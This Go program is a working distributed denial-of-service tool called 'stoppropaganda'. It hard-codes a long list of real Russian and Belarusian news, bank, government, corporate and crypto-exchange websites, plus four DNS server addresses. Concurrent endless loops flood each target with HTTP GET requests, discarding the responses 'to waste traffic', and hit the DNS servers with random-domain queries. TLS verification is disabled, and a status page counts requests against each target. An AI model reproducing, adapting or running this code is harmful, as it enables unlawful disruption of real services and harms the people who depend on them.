package main

import (
	"crypto/tls"
	"encoding/json"
	"flag"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
	"github.com/peterbourgon/ff/v3"
)

/*###
##### https://twitter.com/FedorovMykhailo/status/1497642156076511233
###*/

var dnsServersToDOS = map[string]struct{}{
	"194.54.14.186:53": {},
	"194.54.14.187:53": {},
	"194.67.7.1:53":    {},
	"194.67.2.109:53":  {},
}

var links = map[string]struct{}{
	/* Other countries */

	"https://bukimevieningi.lt": {},
	"https://musutv.lt":         {},
	"https://baltnews.lt":       {},
	"https://lt.rubaltic.ru":    {},
	"http://sputniknews.lt":     {},
	"https://lv.sputniknews.ru": {},
	"https://viada.lt":          {},

	/* Russia */

	// Propaganda
	"https://lenta.ru":          {},
	"https://ria.ru":            {},
	"https://ria.ru/lenta":      {},
	"https://www.rbc.ru":        {},
	"https://www.rt.com":        {},
	"https://smotrim.ru":        {},
	"https://tass.ru":           {},
	"https://tvzvezda.ru":       {},
	"https://vsoloviev.ru":      {},
	"https://www.1tv.ru":        {},
	"https://www.vesti.ru":      {},
	"https://zakupki.gov.ru":    {},
	"https://er.ru":             {},
	"https://www.rzd.ru":        {},
	"https://rzdlog.ru":         {},
	"https://vgtrk.ru":          {},
	"https://www.interfax.ru":   {},
	"https://ugmk.ua":           {},
	"https://iz.ru":             {},
	"https://vz.ru":             {},
	"https://sputniknews.ru":    {},
	"https://www.gazeta.ru":     {},
	"https://www.kp.ru":         {},
	"https://riafan.ru":         {},
	"https://pikabu.ru":         {},
	"https://www.kommersant.ru": {},
	"https://omk.ru":            {},
	"https://www.yaplakal.com":  {},
	"https://bezformata.com":    {},
	"https://regnum.ru":         {},
	"https://eadaily.com":       {},
	"https://www.rubaltic.ru":   {},

	// Business corporations
	"https://www.gazprom.ru":                    {},
	"https://lukoil.ru":                         {},
	"https://magnit.ru":                         {},
	"https://www.nornickel.com":                 {},
	"https://www.surgutneftegas.ru":             {},
	"https://www.tatneft.ru":                    {},
	"https://www.evraz.com/ru":                  {},
	"https://nlmk.com":                          {},
	"https://www.sibur.ru":                      {},
	"https://www.severstal.com":                 {},
	"https://www.metalloinvest.com":             {},
	"https://nangs.org":                         {},
	"https://rmk-group.ru/ru":                   {},
	"https://www.tmk-group.ru":                  {},
	"https://ya.ru":                             {},
	"https://www.polymetalinternational.com/ru": {},
	"https://www.uralkali.com/ru":               {},
	"https://www.eurosib.ru":                    {},

	// Banks
	"https://www.sberbank.ru":                          {},
	"https://online.sberbank.ru":                       {},
	"https://www.vtb.ru":                               {},
	"https://www.gazprombank.ru":                       {},
	"https://api.developer.sber.ru/product/SberbankID": {},
	"https://api.sberbank.ru/prod/tokens/v2":           {},
	"https://api.sberbank.ru/prod/tokens/v2/oauth":     {},
	"https://api.sberbank.ru/prod/tokens/v2/oidc":      {},
	"https://www.moex.com":                             {},
	"http://www.fsb.ru":                                {},

	//The state
	"https://gosuslugi.ru":         {},
	"https://www.mos.ru/uslugi":    {},
	"http://kremlin.ru":            {},
	"http://en.kremlin.ru":         {},
	"http://government.ru":         {},
	"https://mil.ru":               {},
	"https://www.nalog.gov.ru":     {},
	"https://customs.gov.ru":       {},
	"https://pfr.gov.ru":           {},
	"https://rkn.gov.ru":           {},
	"https://www.gosuslugi.ru":     {},
	"https://gosuslugi41.ru":       {},
	"https://uslugi27.ru":          {},
	"https://gosuslugi29.ru":       {},
	"https://gosuslugi.astrobl.ru": {},

	// Others
	"https://109.207.1.118":          {},
	"https://109.207.1.97":           {},
	"https://mail.rkn.gov.ru":        {},
	"https://cloud.rkn.gov.ru":       {},
	"https://mvd.gov.ru":             {},
	"https://pwd.wto.economy.gov.ru": {},
	"https://stroi.gov.ru":           {},
	"https://proverki.gov.ru":        {},
	"https://shop-rt.com":            {},

	// Exchanges connected to russian banks
	"https://cleanbtc.ru":       {},
	"https://bonkypay.com":      {},
	"https://changer.club":      {},
	"https://superchange.net":   {},
	"https://mine.exchange":     {},
	"https://platov.co":         {},
	"https://ww-pay.net":        {},
	"https://delets.cash":       {},
	"https://betatransfer.org":  {},
	"https://ramon.money":       {},
	"https://coinpaymaster.com": {},
	"https://bitokk.biz":        {},
	"https://www.netex24.net":   {},
	"https://cashbank.pro":      {},
	"https://flashobmen.com":    {},
	"https://abcobmen.com":      {},
	"https://ychanger.net":      {},
	"https://multichange.net":   {},
	"https://24paybank.ne":      {},
	"https://royal.cash":        {},
	"https://prostocash.com":    {},
	"https://baksman.org":       {},
	"https://kupibit.me":        {},

	/* BELARUS */

	// by gov
	"https://mininform.gov.by":       {},
	"https://rec.gov.by/ru":          {},
	"https://www.mil.by":             {},
	"https://www.government.by":      {},
	"https://president.gov.by/ru":    {},
	"https://www.mvd.gov.by/ru":      {},
	"http://www.kgb.by/ru":           {},
	"https://www.prokuratura.gov.by": {},

	// by banks
	"https://www.nbrb.by":                 {},
	"https://belarusbank.by":              {},
	"https://brrb.by":                     {},
	"https://www.belapb.by":               {},
	"https://bankdabrabyt.by":             {},
	"https://belinvestbank.by/individual": {},

	// by business
	"https://bgp.by/ru":           {},
	"https://www.belneftekhim.by": {},
	"http://www.bellegprom.by":    {},
	"https://www.energo.by":       {},
	"http://belres.by/ru":         {},

	// by media
	"http://belta.by":           {},
	"https://sputnik.by":        {},
	"https://www.tvr.by":        {},
	"https://www.sb.by":         {},
	"https://belmarket.by":      {},
	"https://www.belarus.by":    {},
	"https://belarus24.by":      {},
	"https://ont.by":            {},
	"https://www.024.by":        {},
	"https://www.belnovosti.by": {},
	"https://mogilevnews.by":    {},
	"https://yandex.by":         {},
	"https://www.slonves.by":    {},
	"http://www.ctv.by":         {},
	"https://radiobelarus.by":   {},
	"https://radiusfm.by":       {},
	"https://alfaradio.by":      {},
	"https://radiomir.by":       {},
	"https://radiostalica.by":   {},
	"https://radiobrestfm.by":   {},
	"https://www.tvrmogilev.by": {},
	"https://minsknews.by":      {},
	"https://zarya.by":          {},
	"https://grodnonews.by":     {},
}

type DNSServer struct {
	Requests     uint   `json:"requests"`
	Success      uint   `json:"success"`
	Errors       uint   `json:"errors"`
	LastErrorMsg string `json:"last_error_msg"`

	mux *sync.Mutex
}

type Website struct {
	Requests     uint   `json:"requests"`
	Errors       uint   `json:"errors"`
	LastErrorMsg string `json:"last_error_msg"`

	Counter_code100 uint `json:"status_100"`
	Counter_code200 uint `json:"status_200"`
	Counter_code300 uint `json:"status_300"`
	Counter_code400 uint `json:"status_400"`
	Counter_code500 uint `json:"status_500"`

	mux *sync.Mutex
}

var dnsServers = map[string]*DNSServer{}
var websites = map[string]*Website{}

var httpClient http.Client

var fs = flag.NewFlagSet("stoppropaganda", flag.ExitOnError)
var (
	flagWorkers    = fs.Int("workers", 20, "DOS each website with this amount of workers")
	flagDNSWorkers = fs.Int("dnsworkers", 100, "DOS each DNS server with this amount of workers")
	flagUserAgent  = fs.String("useragent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36", "User agent used in HTTP requests")
	flagTimeout    = fs.Duration("timeout", 10*time.Second, "timeout of HTTP request")
	flagBind       = fs.String("bind", ":8049", "bind on specific host:port")
)

func main() {
	ff.Parse(fs, os.Args[1:], ff.WithEnvVarPrefix("SP"))

	// DNS servers
	for dnsServer := range dnsServersToDOS {
		dnsServers[dnsServer] = &DNSServer{mux: &sync.Mutex{}}
		dnsServers[dnsServer].Start(dnsServer)
	}

	// Websites
	for link := range links {
		websites[link] = &Website{mux: &sync.Mutex{}}
		websites[link].Start(link)
	}

	http.HandleFunc("/status", status)
	log.Println("Started!")
	panic(http.ListenAndServe(*flagBind, nil))
}

type StatusStruct struct {
	DNS      map[string]*DNSServer `json:"DNS"`
	Websites map[string]*Website   `json:"Websites"`

	mux *sync.Mutex
}

func status(w http.ResponseWriter, req *http.Request) {
	statusStruct := StatusStruct{
		DNS:      make(map[string]*DNSServer, len(dnsServers)),
		Websites: make(map[string]*Website, len(websites)),

		mux: &sync.Mutex{},
	}

	wg := sync.WaitGroup{}
	wg.Add(len(dnsServers))
	wg.Add(len(websites))

	for endpoint, ds := range dnsServers {
		go func(endpoint string, ds *DNSServer) {
			ds.mux.Lock()
			dnsServer := *ds
			ds.mux.Unlock()

			statusStruct.mux.Lock()
			statusStruct.DNS[endpoint] = &dnsServer
			statusStruct.mux.Unlock()

			wg.Done()
		}(endpoint, ds)
	}

	for endpoint, ws := range websites {
		go func(endpoint string, ws *Website) {
			ws.mux.Lock()
			tmpWebsite := *ws
			ws.mux.Unlock()

			statusStruct.mux.Lock()
			statusStruct.Websites[endpoint] = &tmpWebsite
			statusStruct.mux.Unlock()

			wg.Done()
		}(endpoint, ws)
	}

	wg.Wait()

	content, err := json.MarshalIndent(statusStruct, "", "    ")
	if err != nil {
		http.Error(w, "failed to marshal data", http.StatusInternalServerError)
		return
	}
	w.WriteHeader(200)
	w.Write(content)
}

func (ds *DNSServer) Start(endpoint string) {
	c := new(dns.Client)
	c.Dialer = &net.Dialer{
		Timeout: *flagTimeout,
	}

	f := func() {
		for {
			domain := getRandomDomain()
			m := new(dns.Msg)
			m.SetQuestion(domain+".", dns.TypeAAAA)
			_, _, err := c.Exchange(m, endpoint)

			ds.mux.Lock()
			ds.Requests++
			if err != nil && !strings.HasSuffix(err.Error(), "no such host") {
				ds.Errors++
				ds.LastErrorMsg = err.Error()
			} else {
				ds.Success++
			}
			ds.mux.Unlock()
		}
	}

	for i := 0; i < *flagDNSWorkers; i++ {
		go f()
	}
}

func (ws *Website) Start(endpoint string) {
	websiteURL, err := url.Parse(endpoint)
	if err != nil {
		panic(err)
	}

	f := func() {
		for {
			// Create request
			req, err := http.NewRequest("GET", endpoint, nil)
			if err != nil {
				panic(err)
			}

			// Set headers
			req.Header.Set("Host", websiteURL.Host)
			req.Header.Set("User-Agent", *flagUserAgent)
			req.Header.Set("Accept", "*/*")

			// Perform request
			resp, err := httpClient.Do(req)
			if err != nil {
				ws.mux.Lock()
				ws.Requests++
				ws.Errors++
				ws.LastErrorMsg = err.Error()
				ws.mux.Unlock()
				continue
			}

			// Increase counters
			ws.mux.Lock()
			ws.Requests++
			if resp.StatusCode >= 100 && resp.StatusCode < 200 {
				ws.Counter_code100++
			} else if resp.StatusCode >= 200 && resp.StatusCode < 300 {
				ws.Counter_code200++
			} else if resp.StatusCode >= 300 && resp.StatusCode < 400 {
				ws.Counter_code300++
			} else if resp.StatusCode >= 400 && resp.StatusCode < 500 {
				ws.Counter_code400++
			} else if resp.StatusCode >= 500 && resp.StatusCode < 600 {
				ws.Counter_code500++
			}
			ws.mux.Unlock()

			// Download (and discard) response body to waste traffic
			_, err = io.Copy(ioutil.Discard, resp.Body)
			if err != nil {
				ws.mux.Lock()
				ws.Errors++
				ws.mux.Unlock()
			}
			resp.Body.Close()
		}
	}

	for i := 0; i < *flagWorkers; i++ {
		go f()
	}
}

func init() {
	rand.Seed(time.Now().UnixNano())

	fIgnoreRedirects := func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	tr := &http.Transport{
		DisableCompression: true,                                  // Disable automatic decompression
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: true}, // Disable TLS verification
	}
	httpClient = http.Client{
		Timeout:       *flagTimeout,     // Enable timeout
		CheckRedirect: fIgnoreRedirects, // Disable auto redirects
		Transport:     tr,
	}
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyz")

func getRandomDomain() string {
	randomLength := rand.Intn(20-6) + 6 // from 6 to 20 characters length + ".ru"
	b := make([]rune, randomLength)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b) + ".ru"
}
